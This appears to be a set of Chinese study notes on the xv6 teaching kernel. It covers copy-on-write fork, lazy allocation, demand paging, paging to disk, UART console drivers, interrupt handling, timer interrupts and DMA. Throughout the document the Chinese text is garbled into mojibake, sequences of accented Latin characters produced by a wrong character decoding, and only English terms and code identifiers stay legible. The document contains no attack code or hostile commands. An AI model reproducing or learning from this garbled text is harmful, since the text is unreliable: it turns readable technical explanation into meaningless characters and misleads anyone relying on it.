COW forkè®¸å¤šå†…æ ¸ä½¿ç”¨é¡µé¢é”™è¯¯æ¥å®ç° COWï¼ŒåŠ å¿« forkï¼Œå®ƒä¸éœ€è¦å¤åˆ¶å†…å­˜ï¼Œç‰¹åˆ«æ˜¯åœ¨ fork å exec æ—¶å¾ˆé«˜æ•ˆ åœ¨ xv6 ä¸­ï¼Œfork ä¼šè®©å­è¿›ç¨‹çš„åˆå§‹å†…å­˜ä¸çˆ¶è¿›ç¨‹çš„ç›¸åŒï¼Œå®ƒè°ƒç”¨ uvmcopy ç»™å­è¿›ç¨‹åˆ†é…ç‰©ç†ç©ºé—´å¹¶å¤åˆ¶çˆ¶è¿›ç¨‹çš„å†…å­˜ç»™å®ƒ å¦‚æœçˆ¶å­è¿›ç¨‹å…±äº«çˆ¶è¿›ç¨‹çš„ç‰©ç†å†…å­˜ä¼šæ›´åŠ é«˜æ•ˆ COW fork çš„ç®€å•è®¡åˆ’ çˆ¶å­è¿›ç¨‹ä¸€å¼€å§‹å…±äº«æ‰€æœ‰çš„ç‰©ç†é¡µï¼Œä¸”è®¾ä¸ºåªè¯» å½“æŸä¸ªè¿›ç¨‹è¦å†™å…¥å†…å­˜æ—¶ï¼ŒCPU æŠ›å‡ºé¡µé¢é”™è¯¯å¼‚å¸¸ å†…æ ¸çš„ trap å¤„ç†ç¨‹åºåˆ†é…ä¸€ä¸ªæ–°çš„ç‰©ç†é¡µé¢ï¼Œå¹¶å°†åŸé¡µé¢çš„å†…å®¹å¤åˆ¶è¿‡å» å°†å‡ºé”™è¿›ç¨‹çš„é¡µè¡¨ä¸­ç›¸å…³ PTE æŒ‡å‘å‰¯æœ¬ï¼Œå…è®¸è¯»å†™ï¼Œç„¶åé‡æ–°æ‰§è¡ŒæŒ‡ä»¤ COW éœ€è¦ä¸€ä¸ªè®°å½•ï¼Œæ¥å†³å®šç‰©ç†é¡µé¢ä½•æ—¶é‡Šæ”¾ï¼Œå®ƒå¯èƒ½æœ‰å¤šä¸ªè¿›ç¨‹åœ¨ä½¿ç”¨ï¼›å½“å‘ç”Ÿ store é¡µé¢é”™è¯¯æ—¶ï¼Œå¦‚æœè¯¥ç‰©ç†é¡µé¢åªæœ‰å‡ºé”™è¿›ç¨‹æŒ‡å‘å®ƒï¼Œä¸éœ€è¦å†å¤åˆ¶ï¼Œç›´æ¥ä½¿ç”¨ Lazy allocationç”¨æˆ·ç¨‹åºè°ƒç”¨ sbrk ç”³è¯·æ›´å¤šå†…å­˜æ—¶ï¼Œå†…æ ¸å…ˆå¢åŠ å®ƒçš„ sizeï¼Œä½†ä¸ç”³è¯·ç‰©ç†å†…å­˜ï¼Œä¸åˆ›å»ºæ˜ å°„ å½“ç”¨æˆ·ç¨‹åºè®¿é—®æ–°åœ°å€æ—¶ï¼Œä¼šå‘ç”Ÿé¡µé¢é”™è¯¯ï¼Œå†…æ ¸å†ç”³è¯·ä¸€é¡µç‰©ç†å†…å­˜å¹¶åœ¨é¡µè¡¨æ·»åŠ æ˜ å°„ kalloc åˆå§‹åŒ–é¡µé¢ é¡µé¢æ˜ å°„ æ›´æ–°é¡µè¡¨ é‡æ–°æ‰§è¡ŒæŒ‡ä»¤ å¦‚æœç”¨æˆ·ç¨‹åºç”³è¯·äº†å¾ˆå¤§å†…å­˜ï¼Œä½†æ˜¯ä¸å»ä½¿ç”¨ï¼ŒLazy allocation ä¼šæé«˜æ•ˆç‡ lazy allocation å¯ä»¥è®©ç©ºé—´æˆæœ¬éšæ—¶é—´åˆ†æ‘Šï¼Œä½†æ˜¯ä¼šå¯¼è‡´é¡µé¢é”™è¯¯çš„é¢å¤–å¼€é”€ å†…æ ¸å¯ä»¥é€šè¿‡åˆ†é…ä¸€æ‰¹è¿ç»­é¡µé¢ï¼Œå¯¹é¡µé¢é”™è¯¯çš„ trap å¤„ç†ç¨‹åºè¿›è¡Œç‰¹æ®ŠåŒ–æ¥å‡å°å¼€é”€ Demand pagingåœ¨ exec ä¸­ï¼Œxv6 ä¼šå°†ç¨‹åºçš„æ‰€æœ‰ text å’Œ data ç›´æ¥åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œç”±äºç¨‹åºå¯èƒ½ä¼šå¾ˆå¤§ï¼Œä»ç£ç›˜ä¸­è¯»å–å¼€é”€æ˜‚è´µ ç°ä»£å†…æ ¸ä¸ºç”¨æˆ·åœ°å€ç©ºé—´åˆ›å»ºé¡µè¡¨ï¼Œä½†æ˜¯ PTE æ ‡è®°ä¸ºæ— æ•ˆ å½“å‡ºç°é¡µé¢é”™è¯¯æ—¶ï¼Œå†…æ ¸å°†é¡µé¢çš„å†…å®¹ä»ç£ç›˜ä¸­è¯»å–ï¼Œæ·»åŠ æ˜ å°„ Paging to diskä¸€ä¸ªè¿›ç¨‹å¯èƒ½éœ€è¦çš„å†…å­˜å¤šäºè®¡ç®—æœºçš„ RAMï¼Œæ“ä½œç³»ç»Ÿå¯èƒ½ä¼šå®ç° paging to disk å†…æ ¸ä¼šå°†ç”¨æˆ·é¡µé¢çš„ä¸€éƒ¨åˆ†æ”¾åœ¨å†…å­˜ä¸­ï¼Œå…¶ä½™çš„é¡µé¢ä¿å­˜åˆ°ç£ç›˜ä¸­çš„ paging area åŒºåŸŸï¼Œå¹¶å°†å¯¹åº”çš„ PTE æ ‡è®°ä¸ºæ— æ•ˆ å½“è¿›ç¨‹å°è¯•è®¿é—®ç£ç›˜ä¸Šçš„é¡µé¢ï¼Œä¼šå‘ç”Ÿé¡µé¢é”™è¯¯ï¼Œå†…æ ¸ä¼šå°†è¯¥é¡µé¢ä»ç¡¬ç›˜ä¸­è¯»å–å‡ºæ¥ å¦‚æœæ²¡æœ‰å¤šä½™çš„å†…å­˜ å†…æ ¸å…ˆå°†ä¸€ä¸ªé¡µé¢é©±é€ï¼Œä¿å­˜åˆ°ç£ç›˜ä¸­ï¼Œå°†å¯¹åº”çš„ PTE æ ‡è®°ä¸ºæ— æ•ˆï¼Œä½†æ˜¯é©±é€çš„èŠ±é”€æ˜¯æ˜‚è´µçš„ çœŸå®ä¸–ç•Œå¦‚æœå°†å†…æ ¸å†…å­˜æ˜ å°„åˆ°æ¯ä¸ªè¿›ç¨‹çš„ç”¨æˆ·é¡µè¡¨ä¸­ï¼Œå¯ä»¥æ¶ˆé™¤å¯¹é¡µè¡¨åˆ‡æ¢çš„éœ€æ±‚ ç”Ÿäº§ç¯å¢ƒçš„æ“ä½œç³»ç»Ÿå®ç°äº† COWã€Lazy allocationã€Demand pagingã€Paging to diskã€Memory-mapped files ç­‰ç­‰ xv6 æ²¡æœ‰è¿™æ ·åšï¼Œå¦‚æœç”¨å®Œå†…å­˜ï¼Œ Chapter 5 Interrupts and device drivers é©±åŠ¨ç¨‹åºï¼ˆdriverï¼‰ æ“ä½œç³»ç»Ÿä¸­ç®¡ç†ç‰¹å®šè®¾å¤‡çš„ä»£ç å®ƒé…ç½®ç¡¬ä»¶ï¼Œå‘Šè¯‰è®¾å¤‡æ‰§è¡Œæ“ä½œï¼Œå¤„ç†äº§ç”Ÿçš„ä¸­æ–­ï¼Œä¸å¯èƒ½æ­£åœ¨ç­‰å¾…æ¥è‡ªè®¾å¤‡ I/O çš„è¿›ç¨‹è¿›è¡Œäº¤äº’ driver ä»£ç å¯èƒ½å¾ˆå¤æ‚ï¼Œå› ä¸ºé©±åŠ¨ç¨‹åºä¸å®ƒç®¡ç†çš„è®¾å¤‡è¦åŒæ—¶æ‰§è¡Œ driver å¿…é¡»äº†è§£è®¾å¤‡çš„ç¡¬ä»¶æ¥å£ï¼Œæ¥å£å¯èƒ½å¾ˆå¤æ‚ä¸”ç¼ºä¹æ–‡æ¡£è®°å½• åç»­é©±åŠ¨ç¨‹åºç”¨ driver è¡¨ç¤ºï¼ˆåˆ«é—®ï¼Œé—®å°±æ˜¯ driver åœ¨ä¸€å †ä¸­æ–‡é‡Œæ›´æ¸…æ™°ï¼‰ ä¸­æ–­ï¼ˆInterruptï¼‰ è®¾å¤‡éœ€è¦æ“ä½œç³»ç»Ÿç‰¹åˆ«å…³æ³¨ï¼Œå®ƒå¯ä»¥è¿›è¡Œé…ç½®ï¼Œäº§ç”Ÿä¸­æ–­ï¼ˆtrap çš„ä¸€ç§ï¼‰ å½“è®¾å¤‡å‘èµ·ä¸­æ–­ï¼Œå†…æ ¸ trap å¤„ç†ä»£ç èƒ½è¯†åˆ«å‡ºè®¾å¤‡ä¸­æ–­å¹¶è°ƒç”¨é©±åŠ¨ç¨‹åºçš„ä¸­æ–­å¤„ç†ç¨‹åº åœ¨ xv6 ä¸­ï¼Œä¸­æ–­å¤„ç†çš„åˆ†é…åœ¨ devintr å‡½æ•°ä¸­ è®¸å¤šè®¾å¤‡ driver åœ¨ä¸¤ä¸ªä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»£ç  åœ¨è¿›ç¨‹çš„å†…æ ¸çº¿ç¨‹ä¸­æ‰§è¡Œå‰åŠéƒ¨åˆ† å‰åŠéƒ¨åˆ†ç”±éœ€è¦æ‰§è¡Œ I/O çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆå¦‚ read å’Œ writeï¼‰æ¥è°ƒç”¨ æ­¤ä»£ç å¯èƒ½è¯·æ±‚ç¡¬ä»¶å¯åŠ¨æ“ä½œï¼ˆå¦‚è¯·æ±‚ç¡¬ç›˜è¯»å–å—ï¼‰ï¼Œç„¶åç­‰å¾…æ“ä½œå®Œæˆ æœ€åè®¾å¤‡å®Œæˆæ“ä½œï¼Œå‘èµ·ä¸­æ–­ åœ¨ä¸­æ–­æ—¶æ‰§è¡ŒååŠéƒ¨åˆ† driver çš„ä¸­æ–­å¤„ç†ç¨‹åºä½œä¸ºååŠéƒ¨åˆ† å®ƒæ‰¾åˆ°è®¾å¤‡å®Œæˆçš„æ“ä½œï¼Œåœ¨é€‚å½“çš„æƒ…å†µå”¤é†’æ­£åœ¨ç­‰å¾…çš„è¿›ç¨‹ å‘Šè¯‰ç¡¬ä»¶å¼€å§‹å¤„ç†ä¸‹ä¸€ä¸ªæ“ä½œ ä»£ç ï¼šæ§åˆ¶å°è¾“å…¥æ§åˆ¶å°è¿æ¥åˆ° RISC-Væ§åˆ¶å° driver ä½äº kernel/console.cï¼Œå¯ä½œä¸ºé©±åŠ¨ç¨‹åºç»“æ„çš„ä¸€ä¸ªç®€å•è¯´æ˜ xv6 çš„æ§åˆ¶å° driver äº¤äº’çš„ UART ç¡¬ä»¶æ˜¯ QEMU ä»¿çœŸçš„ 16550 èŠ¯ç‰‡ï¼Œåœ¨çœŸå®çš„è®¡ç®—æœºï¼Œä¸€ä¸ª 16550 èŠ¯ç‰‡ç®¡ç† RS232 ä¸²è¡Œé“¾è·¯ï¼Œè¿æ¥ç€ä¸€ä¸ªä¸­æ–­æˆ–å…¶ä»–è®¡ç®—æœºã€‚å½“è¿è¡Œ QEMU æ—¶ï¼Œå®ƒè¿æ¥ç€é”®ç›˜å’Œæ˜¾ç¤ºå™¨ æ§åˆ¶å° driver ä¸€æ¬¡ç´¯ç§¯ä¸€è¡Œçš„è¾“å…¥ï¼Œå¤„ç†ç‰¹æ®Šçš„è¾“å…¥å­—ç¬¦ï¼Œå¦‚é€€æ ¼ backspace å’Œ control-u å½“ç”¨æˆ·åœ¨ QEMU ä¸­å‘ xv6 è¾“å…¥æ—¶ï¼Œå‡»é”®é€šè¿‡ QEMU æ¨¡æ‹Ÿçš„ UART ç¡¬ä»¶ä¼ é€’ç»™ xv6 ä¸€äº›ç‰©ç†åœ°å€ç”± RISC-V ç¡¬ä»¶è¿æ¥åˆ° UART è®¾å¤‡ ä»è¿™äº›ç‰©ç†åœ°å€è¯»å†™æ˜¯ä¸è®¾å¤‡ç¡¬ä»¶äº¤äº’è€Œä¸æ˜¯å†…å­˜ UART çš„å†…å­˜æ˜ å°„åœ°å€ä» 0x10000000 ï¼ˆæˆ– UART0 kenrel/memlayout.hï¼‰å¼€å§‹ æ§åˆ¶å¯„å­˜å™¨UART ç¡¬ä»¶åœ¨è½¯ä»¶å±‚é¢ä¸ºä¸€ç»„å†…å­˜æ˜ å°„çš„æ§åˆ¶å¯„å­˜å™¨ï¼ˆè¿™é‡Œçš„å¯„å­˜å™¨å¹¶ä¸æ˜¯ CPU å¯„å­˜å™¨ï¼Œè€Œä¸”ä½äº UART ç¡¬ä»¶ä¸­çš„å¯„å­˜å™¨ï¼‰ UART æ§åˆ¶å¯„å­˜å™¨å®½åº¦ä¸º 1 Byteï¼Œå®ƒä»¬åœ¨ UART0 çš„åç§»åœ¨ kernel/uart.c ä¸­å®šä¹‰ LSR line status register æ¯”ç‰¹ä½è¡¨ç¤ºè¾“å…¥çš„å­—ç¬¦æ˜¯å¦åœ¨ç­‰å¾…è½¯ä»¶è¯»å– RHR receive holding register ä¿å­˜ç­‰å¾…è¯»å–çš„å­—ç¬¦ æ¯æ¬¡ä¸€ä¸ªå­—ç¬¦è¢«è¯»å–ï¼ŒUART ç¡¬ä»¶å°†å®ƒä»ä¸€ä¸ª FIFO çš„ç»“æ„ä¸­åˆ é™¤ å½“ FIFO ç»“æ„ä¸ºç©ºæ—¶å°† LSR çš„ ready ä½æ¸…é›¶ THR transimit holding register ä¿å­˜ç­‰å¾…ä¼ è¾“çš„å­—ç¬¦ UART ä¼ è¾“ç¡¬ä»¶å¾ˆå¤§ç¨‹åº¦ä¸Šç‹¬ç«‹äºæ¥æ”¶ç¡¬ä»¶ï¼Œå¦‚æœè½¯ä»¶å‘ THR å†™ 1 Byteï¼ŒUART å°±ä¼ è¾“è¯¥å­—èŠ‚ xv6 çš„æ§åˆ¶å°è¾“å…¥xv6 çš„ main è°ƒç”¨ consoleinit æ¥åˆå§‹åŒ– UART ç¡¬ä»¶ï¼Œé…ç½® UART è®©å®ƒæ¯æ¥æ”¶åˆ° 1 Byte è¾“å…¥å°±ç”Ÿæˆä¸€ä¸ª receive ä¸­æ–­ï¼Œæ¯å®Œæˆ 1 Byte çš„è¾“å‡ºå°±ç”Ÿæˆä¸€ä¸ª transmit complete ä¸­æ–­ ç”¨æˆ·è¿›ç¨‹ï¼Œå¦‚ shellï¼Œé€šè¿‡ user/init.c æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä½¿ç”¨ read ç³»ç»Ÿè°ƒç”¨ä»æ§åˆ¶å°è·å–è¾“å…¥è¡Œ read ç³»ç»Ÿè°ƒç”¨é€šè¿‡å†…æ ¸çš„ consoleread å®Œæˆæ“ä½œ consoleread ç­‰å¾…è¾“å…¥ï¼ˆé€šè¿‡ä¸­æ–­ï¼‰ï¼Œç„¶åå°†å­—ç¬¦æ”¾å…¥ cons.buf ä½œä¸ºç¼“å†²ï¼ŒæŠŠè¾“å…¥å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼Œç›´åˆ°ä¸€æ•´è¡Œè¾“å…¥åˆ°è¾¾ï¼Œè¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹ å¦‚æœç”¨æˆ·è¿˜æ²¡æœ‰è¾“å…¥ä¸€æ•´è¡Œï¼Œä»»ä½•éœ€è¦è¯»å–çš„è¿›ç¨‹éƒ½åœ¨ sleep è°ƒç”¨ä¸­ç­‰å¾… å½“ç”¨æˆ·è¾“å…¥ä¸€ä¸ªå­—ç¬¦ UART ç¡¬ä»¶è¯·æ±‚ RISC-V å‘èµ·ä¸­æ–­ï¼Œæ¿€æ´» xv6 çš„ trap å¤„ç†ç¨‹åº trap å¤„ç†ç¨‹åºä¼šè°ƒç”¨ devintrï¼Œä» scause å¯„å­˜å™¨æŸ¥æ‰¾ä¸­æ–­æ¥è‡ªå“ªä¸ªå¤–éƒ¨è®¾å¤‡ï¼Œç„¶åå‘Šè¯‰ PLIC ç¡¬ä»¶å•å…ƒå“ªä¸ªè®¾å¤‡å‘å‡ºä¸­æ–­ï¼Œå¦‚æœæ¥è‡ª UARTï¼Œdevintr ä¼šè°ƒç”¨ uartintr uartintr è¯»å–æ¥è‡ª UART ç¡¬ä»¶çš„ç­‰å¾…è¾“å…¥çš„å­—ç¬¦ï¼ˆRHRï¼‰ï¼Œå°†å®ƒä»¬ä¼ ç»™ consoleintr consoleintr ä¼šå°†å­—ç¬¦ç§¯ç´¯åœ¨ cons.bufï¼Œä½†å¯¹ backspace å’Œä¸€äº›å…¶ä»–å­—ç¬¦ç‰¹æ®Šå¤„ç† å½“ä¸€è¡Œæ–°çš„å­—ç¬¦åˆ°è¾¾ï¼ˆè¯»å–åˆ° â€˜\\nâ€™ï¼‰æ—¶ï¼Œconsoleintr ä¼šå”¤é†’ä¸€ä¸ªæ­£åœ¨ç­‰ç€ç­‰å¾…çš„ consoleread ä»£ç ï¼šæ§åˆ¶å°è¾“å‡ºè®¾å¤‡ driver ç»´æŠ¤ä¸€ä¸ªè¾“å…¥ç¼“å†²åŒº uart_tx_bufï¼Œå› æ­¤éœ€è¦è¾“å‡ºçš„è¿›ç¨‹ä¸éœ€è¦ç­‰å¾… UART å®Œæˆå‘é€ï¼Œé™¤éç¼“å†²åŒºå·²æ»¡ write ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨è¿æ¥ç€æ§åˆ¶å°çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæœ€ç»ˆä¼šåˆ°è¾¾ uartputc uartputc å°†æ¯ä¸ªå­—ç¬¦åŠ å…¥ç¼“å†²åŒºï¼Œè°ƒç”¨ uartstart å¼€å§‹è®¾å¤‡ä¼ è¾“å¹¶è¿”å› UART æ¯å®Œæˆä¸€ä¸ªå­—èŠ‚çš„å‘é€ï¼Œå°±ä¼šå‘èµ·ä¸­æ–­ï¼Œuartintr è°ƒç”¨ uartstart æ£€æŸ¥è®¾å¤‡æ˜¯å¦å·²ç»å®Œæˆå‘é€ï¼Œç„¶åå°†ä¸‹ä¸€ä¸ªç¼“å†²çš„è¾“å‡ºå­—ç¬¦ä¼ ç»™è®¾å¤‡ å¦‚æœä¸€ä¸ªè¿›ç¨‹å°†å¤šä¸ªå­—èŠ‚å†™å…¥æ§åˆ¶å°ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä¼šç”± uartputc è°ƒç”¨çš„ uartstart æ¥å‘é€ï¼Œå‰©ä¸‹çš„å­—èŠ‚ç”± uartintr è°ƒç”¨çš„ uartstart æ¥å‘é€ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œé€šè¿‡ç¼“å†²å’Œä¸­æ–­å°†è®¾å¤‡æ´»åŠ¨å’Œè¿›ç¨‹æ´»åŠ¨è¿›è¡Œè§£è€¦ æ§åˆ¶å° driver å¯ä»¥å¤„ç†è¾“å…¥ï¼Œå³ä½¿æ²¡æœ‰è¿›ç¨‹ç­‰å¾…è¯»å–ï¼Œä¸€ä¸ªåæ¥çš„è¯»å–å¯ä»¥çœ‹åˆ°è¾“å…¥ï¼›è¿›ç¨‹å¯ä»¥ä¸ç­‰å¾…è®¾å¤‡å‘é€è¾“å‡º è§£è€¦é€šè¿‡å…è®¸è¿›ç¨‹ä¸è®¾å¤‡ I/O åŒæ—¶æ‰§è¡Œæ¥æé«˜æ€§èƒ½ï¼Œå½“è®¾å¤‡é€Ÿåº¦æ…¢ï¼ˆå¦‚ UARTï¼‰æˆ–éœ€è¦å³æ—¶å“åº”ï¼ˆå¦‚å›åº”é”®å…¥çš„å­—ç¬¦ï¼‰æ—¶å°¤å…¶é‡è¦ è¿™ä¹Ÿè¢«ç§°ä¸º I/O å¹¶è¡Œ é©±åŠ¨ç¨‹åºä¸­çš„å¹¶å‘ä½ å¯èƒ½æ³¨æ„åˆ°åœ¨ consoleread å’Œ consoleintr ä¸­è°ƒç”¨ acquire è¿™ä¸ªè°ƒç”¨ç”³è¯·ä¸€ä¸ªğŸ”’ï¼Œä¿æŠ¤æ§åˆ¶å° driver çš„æ•°æ®ç»“æ„å…å—å¹¶å‘è®¿é—®å½±å“ ä¸‰ä¸ªå¹¶å‘å±é™©ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç«äº‰æˆ–æ­»é” ä¸¤ä¸ªåœ¨ä¸åŒ CPU æ ¸çš„è¿›ç¨‹åŒæ—¶è°ƒç”¨ consoleread å½“ CPU æ­£åœ¨æ‰§è¡Œ consoleread æ—¶ï¼Œç¡¬ä»¶å¯èƒ½è¯·æ±‚è¯¥ CPU å‘é€æ§åˆ¶å°ä¸­æ–­ å½“ CPU æ­£åœ¨æ‰§è¡Œ consoleread æ—¶ï¼Œç¡¬ä»¶å¯èƒ½åœ¨å¦ä¸€ä¸ª CPU ä¸­å‘é€æ§åˆ¶å°ä¸­æ–­ drivers çš„å¹¶å‘å¦ä¸€ä¸ªéœ€è¦å°å¿ƒçš„åœ°æ–¹ï¼šä¸€ä¸ªè¿›ç¨‹å¯èƒ½ç­‰å¾…è®¾å¤‡è¾“å…¥ï¼Œå½“å¦ä¸€ä¸ªè¿›ç¨‹åœ¨è¿è¡Œæ—¶ï¼Œè¾“å…¥çš„ä¸­æ–­ä¿¡å·å¯èƒ½åˆ°è¾¾ ä¸­æ–­å¤„ç†ç¨‹åºä¸ä¼šè€ƒè™‘ä¸­æ–­çš„è¿›ç¨‹å’Œä»£ç ï¼Œä¾‹å¦‚ä¸€ä¸ªä¸­æ–­å¤„ç†ç¨‹åºæ— æ³•å®‰å…¨åœ°ä½¿ç”¨å½“å‰è¿›ç¨‹çš„é¡µè¡¨è°ƒç”¨ copyoutï¼Œå®ƒåªä¼šåšå¾ˆå°‘é‡çš„å·¥ä½œï¼ˆå¦‚ï¼Œå°†è¾“å…¥æ•°æ®å¤åˆ¶åˆ°ç¼“å†²åŒºï¼‰ï¼Œå¹¶å”¤é†’å‰åŠéƒ¨åˆ†ä»£ç å®Œæˆå…¶ä½™å·¥ä½œ å®šæ—¶å™¨ä¸­æ–­Xv6 ä½¿ç”¨å®šæ—¶å™¨ä¸­æ–­ç»´æŒæ—¶é’Ÿï¼Œä½¿å…¶èƒ½åœ¨è¿›ç¨‹ä¹‹é—´åˆ‡æ¢è¿›è¡Œè°ƒåº¦ usertrap å’Œ kerneltrap ä¸­çš„ yield è°ƒç”¨ä¹Ÿä¼šå¯¼è‡´è¿™ç±»åˆ‡æ¢ å®šæ—¶å™¨ä¸­æ–­æ¥è‡ª RISC-V ä¸­æ¯ä¸ª CPU çš„æ—¶é’Ÿç¡¬ä»¶ï¼Œxv6 å¯¹è¿™ä¸ªæ—¶é’Ÿç¡¬ä»¶ç¼–ç¨‹ï¼Œä»¥å®šæœŸä¸­æ–­æ¯ä¸ª CPU RISC-V è¦æ±‚è®¡æ—¶å™¨ä¸­æ–­è¦ç”±æœºå™¨æ¨¡å¼æ¥ç®¡ï¼Œè€Œä¸æ˜¯ç®¡ç†è€…æ¨¡å¼ RISC-V æœºå™¨æ¨¡å¼ä¸ç”¨åˆ†é¡µæ‰§è¡Œä»£ç ï¼Œä½¿ç”¨ä¸€ç»„ç‹¬ç«‹çš„æ§åˆ¶å¯„å­˜å™¨ï¼Œå› æ­¤åœ¨æœºå™¨æ¨¡å¼æ‰§è¡Œæ™®é€šçš„ xv6 å†…æ ¸ä»£ç æ—¶æ˜¯ä¸å®é™…çš„ å› æ­¤ xv6 å°†å®šæ—¶å™¨ä¸­æ–­ç‹¬ç«‹äºä¹‹å‰ä½¿ç”¨çš„ trap æœºåˆ¶è¿›è¡Œå¤„ç† æœºå™¨æ¨¡å¼æ‰§è¡Œçš„ä»£ç åœ¨ kernel/start.c ä¸­ï¼Œåœ¨æ‰§è¡Œ main ä¹‹å‰ï¼Œè®¾ç½®å®šæ—¶å™¨ä¸­æ–­çš„æ¥æ”¶ å¯¹ CLINTï¼ˆcore-local interruptorï¼‰ç¡¬ä»¶è¿›è¡Œç¼–ç¨‹ï¼Œä»¥åœ¨ä¸€å®šå»¶è¿Ÿåç”Ÿæˆä¸­æ–­ è®¾ç«‹ä¸€ä¸ªç±»ä¼¼ trapframe çš„ä¸´æ—¶åŒºåŸŸï¼Œå¸®åŠ©å®šæ—¶å™¨ä¸­æ–­å¤„ç†ç¨‹åºä¿å­˜å¯„å­˜å™¨å’Œ CLINT å¯„å­˜å™¨çš„åœ°å€ æœ€å start å°† mtvec è®¾ç½®ä¸º timervecï¼ˆåœ¨ kernel/kernelvec.S ä¸­ï¼‰ï¼Œå¯ç”¨å®šæ—¶å™¨ä¸­æ–­ çœŸå®ä¸–ç•Œxv6 å…è®¸åœ¨æ‰§è¡Œå†…æ ¸å’Œç”¨æˆ·ç¨‹åºæ—¶å¯ç”¨è®¾å¤‡å’Œå®šæ—¶å™¨ä¸­æ–­ å®šæ—¶å™¨ä¸­æ–­å¼ºåˆ¶çº¿ç¨‹åˆ‡æ¢ï¼Œå³ä½¿æ˜¯åœ¨å†…æ ¸æ€è¿è¡Œï¼Œå› æ­¤å†…æ ¸ä»£ç éœ€è¦æ³¨æ„å®ƒå¯èƒ½è¢«æŒ‚èµ·ï¼Œå¹¶åœ¨ä¸åŒçš„ CPU ä¸Šæ¢å¤ å¦‚æœå†…æ ¸çº¿ç¨‹æœ‰æ—¶èŠ±è´¹å¤§é‡æ—¶é—´è®¡ç®—è€Œä¸è¿”å›ç”¨æˆ·ç©ºé—´ï¼Œåœ¨å†…æ ¸çº¿ç¨‹ä¹‹é—´å…¬å¹³åœ°å¯¹ CPU è¿›è¡Œæ—¶é—´åˆ‡ç‰‡æ˜¯æœ‰æ•ˆçš„ å¦‚æœåªåœ¨æ‰§è¡Œç”¨æˆ·ä»£ç æ—¶å‘ç”Ÿè®¾å¤‡å’Œå®šæ—¶å™¨ä¸­æ–­ï¼Œä¼šè®©å†…æ ¸æ›´ç®€å• åœ¨ä¸€å°è®¡ç®—æœºä¸Šæ”¯æŒæ‰€æœ‰è®¾å¤‡æ˜¯ä¸€é¡¹è‰°å·¨çš„å·¥ä½œï¼Œå› ä¸ºæœ‰è®¸å¤šè®¾å¤‡ï¼Œæœ‰è®¸å¤šåŠŸèƒ½ï¼Œè®¾å¤‡å’Œ driver ä¹‹é—´çš„åè®®å¯èƒ½å¾ˆå¤æ‚ä¸”ç¼ºä¹æ–‡æ¡£ã€‚åœ¨è®¸å¤šæ“ä½œç³»ç»Ÿä¸­ï¼Œdriver æ¯”å†…æ ¸æ ¸å¿ƒä»£ç å ç”¨æ›´å¤š UART driver é€šè¿‡è¯»å– UART æ§åˆ¶å¯„å­˜å™¨ä¸€æ¬¡æ£€ç´¢ 1 Byte çš„æ•°æ®ï¼Œç§°ä¸º programmed I/Oï¼Œå› ä¸ºè½¯ä»¶æ­£åœ¨é©±åŠ¨æ•°æ®ç§»åŠ¨ DMA ç¼–ç¨‹ I/O å¾ˆç®€å•ï¼Œä½†æ˜¯é€Ÿåº¦å¤ªæ…¢ï¼Œæ— æ³•åœ¨é«˜æ•°æ®é€Ÿç‡ä¸‹ä½¿ç”¨ xv6 çš„ UART driver å…ˆå°†ä¼ å…¥çš„æ•°æ®å¤åˆ¶åˆ°å†…æ ¸çš„ç¼“å†²åŒºï¼Œå†å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼Œåœ¨ä½æ•°æ®é€Ÿç‡æ—¶æœ‰æ•ˆï¼Œä½†å¦‚æœè®¾å¤‡äº§ç”Ÿæˆ–ä½¿ç”¨æ•°æ®å¾ˆå¿«ï¼Œä¸¤æ¬¡å¤åˆ¶ä¼šä¸¥é‡é™ä½æ€§èƒ½ å› æ­¤æœ‰ç›´æ¥å­˜å‚¨å™¨è®¿é—®ï¼ˆDMAï¼‰æŠ€æœ¯ DMA ç¡¬ä»¶è®¾å¤‡ç›´æ¥å°†ä¼ å…¥çš„æ•°æ®å†™å…¥ RAMï¼Œå¹¶ä» RAM è¯»å–ä¼ å‡ºçš„æ•°æ® é«˜é€Ÿç§»åŠ¨å¤§é‡æ•°æ®çš„è®¾å¤‡ï¼ˆç°ä»£ç£ç›˜å’Œç½‘ç»œè®¾å¤‡ï¼‰é€šå¸¸ä½¿ç”¨ç›´æ¥å­˜å‚¨å™¨è®¿é—®ï¼ˆDMAï¼‰ ä¸€äº›æ“ä½œç³»ç»Ÿå¸¸ä½¿ç”¨ DMA ç›´æ¥å°†æ•°æ®åœ¨ç”¨æˆ·ç©ºé—´çš„ç¼“å†²åŒºå’Œè®¾å¤‡ç¡¬ä»¶ä¹‹é—´ç§»åŠ¨ DMA è®¾å¤‡ driver åœ¨ RAM ä¸­å‡†å¤‡æ•°æ®ï¼Œå¯¹ä¸€ä¸ªæ§åˆ¶å¯„å­˜å™¨è¿›è¡Œä¸€æ¬¡å†™å…¥å‘Šè¯‰è®¾å¤‡å»å¤„ç†å‡†å¤‡å¥½çš„æ•°æ® ä¸­æ–­ä¼˜åŒ–å½“ä¸€ä¸ªè®¾å¤‡åœ¨ä¸å¯é¢„æµ‹çš„æ—¶é—´éœ€è¦å…³æ³¨æ—¶ï¼Œä¸­æ–­æ˜¯æœ‰æ„ä¹‰çš„ï¼Œä½†æ˜¯ä¸­æ–­æœ‰å¾ˆé«˜çš„ CPU å¼€é”€ é«˜é€Ÿè®¾å¤‡ï¼ˆå¦‚ç½‘ç»œå’Œç£ç›˜æ§åˆ¶å™¨ï¼‰ä½¿ç”¨ä¸€äº›æŠ€å·§å‡å°‘ä¸­æ–­çš„éœ€æ±‚ å¯¹æ•´æ‰¹ä¼ å…¥æˆ–ä¼ å‡ºçš„è¯·æ±‚å‘èµ·ä¸€ä¸ªä¸­æ–­ è½®è¯¢ï¼šå®Œå…¨ç¦ç”¨ä¸­æ–­ï¼Œå®šæœŸæ£€æŸ¥è®¾å¤‡æ˜¯å¦éœ€è¦å…³æ³¨ 